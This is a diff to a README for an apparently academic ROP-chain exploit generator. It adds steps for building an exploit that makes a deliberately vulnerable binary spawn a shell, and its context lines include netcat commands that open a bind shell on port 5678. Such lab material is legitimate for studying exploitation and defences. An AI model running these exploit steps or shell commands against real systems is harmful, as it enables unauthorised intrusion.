@@ -39,6 +39,8 @@ Here are some example command line parameters that can be given as input when pr
 
 * `/bin/sh`
 * `/bin//sh`
+* `/bin/sh ./exe/crl.sh`
+* `/bin/sh ./exe/lyn.sh`
 * `/tmp/nc -lnp 5678 -tte /bin/sh`
 * `/tmp//nc -lnp 5678 -tte /bin//sh`
 
@@ -55,6 +57,23 @@ Open a port on the victim machine using netcat tool that returns a shell (revers
 1. Run the compiled vulnerable binary passing the exploit file as input (e.g. `./vuln3-32 exploit.bin`)
 1. In a separate terminal run `/tmp/nc 127.0.0.1 5678` and check if the reverse shell exploit is working
 
+### Running `ropoverflow_execve.py` Evaluation
+1. Change current directory to vulnerable_programs/: `cd ~/s3/vulnerable_programs`
+1. (Optional) Delete binary files: `make clean`
+1. Compile vulnerable binary files: `make all`
+1. Return to project directory: `cd ..`
+1. Create ROP-chain exploit file for a vulnerable binary: `python3 ropoverflow_execve.py ./vulnerable_programs/vuln3-32-0 exploit.bin`
+1. Enter `execve` parameters when promted by the program: 
+```
+Enter exploit parameters: /bin/sh
+```
+1. Run vulnerable binary file with the exploit file as input: `./vulnerable_programs/vuln3-32-0 exploit.bin`
+1. The program will return an interactive shell:
+```
+opening file
+file opened
+$
+``` 
 ### Running `ropoverflow.py`
 
 The tool `ropoverflow.py` is a Python3 program that given an arbitrary shellcode file will generate a ROP chain that will call the `mprotect` system call which will disable the `write-xor-execute` protection from the stack, and then will call the `read` system call to read the shellcode from the standard input, which will place the shellcode on the program stack, and then execute the payload.
